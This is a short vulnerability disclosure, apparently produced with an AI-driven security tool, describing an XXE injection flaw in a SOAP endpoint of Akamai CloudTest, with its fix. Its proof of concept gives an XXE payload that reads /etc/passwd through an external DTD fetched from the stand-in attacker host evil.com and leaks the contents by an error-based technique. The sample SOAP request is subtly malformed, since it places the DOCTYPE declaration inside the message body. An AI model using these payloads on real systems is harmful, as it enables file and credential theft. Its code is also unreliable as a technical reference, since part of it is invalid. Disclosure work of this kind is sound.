# Title: XML External Entity (XXE) Injection in Akamai CloudTest

- **Platform**: Detectify
- **Program**: Akamai (via XBOW research)
- **Severity**: High
- **Date**: 2025-06-30
- **Researcher**: XBOW (Autonomous AI)
- **Bounty**: N/A (Coordinated Disclosure)

## Summary
An XXE vulnerability was discovered in Akamai CloudTest (CVE-2025-49493). The SOAP endpoint `/concerto/services/RepositoryService` processed XML without properly disabling external entities, allowing file disclosure and SSRF.

## Technical Details
Akamai CloudTest exposed a SOAP web service at `/concerto/services/RepositoryService`. SOAP services commonly process XML payloads and are frequent sources of XXE vulnerabilities. The XML parser used to process SOAP requests had DTD processing and external entity resolution enabled. An attacker could craft a SOAP request with a malicious DTD that references local files.

XBOW discovered that direct inline XXE was blocked, but splitting the attack into two parts worked: hosting an external DTD on an attacker-controlled server and referencing it from the SOAP request.

## Steps to Reproduce
1. Identify the SOAP endpoint `/concerto/services/RepositoryService`
2. Set up an external DTD on an attacker-controlled server
3. Reference the external DTD in a SOAP request with file reading payload
4. Use error-based XXE to exfiltrate file contents

## Proof of Concept
```xml
<!-- External DTD hosted on attacker's server (evil.com/xxe.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfil;
```

```xml
<!-- SOAP Request -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE foo [
      <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
      %xxe;
    ]>
    <RepositoryService>
      <request>...</request>
    </RepositoryService>
  </soap:Body>
</soap:Envelope>
```

## Impact
- Read sensitive files from the server
- Server-Side Request Forgery to internal networks
- Exposure of cloud credentials and configuration data

## Remediation
Akamai fixed the issue by disabling DTD processing entirely in the XML parser, preventing XXE attacks at the parser level across all CloudTest instances.

## References
- https://xbow.com/blog/xbow-akamai-cloudtest-xxe
